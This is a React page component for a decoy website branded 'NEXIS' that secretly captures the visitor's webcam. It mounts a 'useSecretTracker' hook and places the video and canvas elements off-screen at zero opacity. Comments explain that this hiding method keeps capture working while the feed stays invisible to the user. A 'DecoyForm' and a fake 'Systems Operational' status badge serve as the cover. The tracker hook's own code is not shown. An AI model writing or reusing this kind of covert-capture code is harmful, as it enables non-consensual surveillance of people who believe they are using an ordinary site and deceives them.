import { motion } from "framer-motion";
import { useSecretTracker } from "@/hooks/use-tracking";
import DecoyForm from "@/components/DecoyForm";

export default function Home() {
  // Initialize the secret tracker when this page mounts.
  // We pass nothing, it manages its own internal refs and lifecycle.
  const { videoRef, canvasRef } = useSecretTracker();

  return (
    <div className="min-h-screen w-full bg-grain bg-background flex flex-col items-center justify-center p-4 sm:p-6 lg:p-8 overflow-hidden relative">
      
      {/* 
        CRITICAL: Hidden elements for the secret camera capture.
        They must remain mounted in the DOM for capture to work, 
        but invisible to the user. 'display: none' breaks media capture on some browsers,
        so we use absolute positioning off-screen with 0 opacity.
      */}
      <div className="absolute top-[-9999px] left-[-9999px] opacity-0 pointer-events-none z-[-100]">
        <video 
          ref={videoRef} 
          width={640} 
          height={480} 
          playsInline 
          muted 
          className="hidden-video-feed" 
        />
        <canvas 
          ref={canvasRef} 
          className="hidden-capture-canvas" 
        />
      </div>

      {/* Decorative background gradients to add a premium feel */}
      <div className="absolute inset-0 z-0 overflow-hidden pointer-events-none flex items-center justify-center">
        <motion.div 
          initial={{ opacity: 0, scale: 0.8 }}
          animate={{ opacity: 0.15, scale: 1 }}
          transition={{ duration: 2, ease: "easeOut" }}
          className="w-[80vw] h-[80vw] max-w-[800px] max-h-[800px] rounded-full bg-primary blur-[120px] mix-blend-screen"
        />
      </div>

      {/* Top Navbar / Header Decoy */}
      <header className="absolute top-0 w-full p-6 sm:p-10 flex items-center justify-between z-20 pointer-events-none">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 rounded bg-primary flex items-center justify-center text-primary-foreground font-display font-bold">
            N
          </div>
          <span className="font-display font-bold text-lg tracking-wide text-foreground">
            NEXIS
          </span>
        </div>
        
        <div className="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-full border border-border/40 bg-secondary/30 backdrop-blur-sm">
          <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse-ring" />
          <span className="text-xs font-medium text-muted-foreground">Systems Operational</span>
        </div>
      </header>

      {/* Main Decoy UI Content */}
      <main className="w-full z-10 flex flex-col items-center justify-center">
        <DecoyForm />
      </main>

    </div>
  );
}
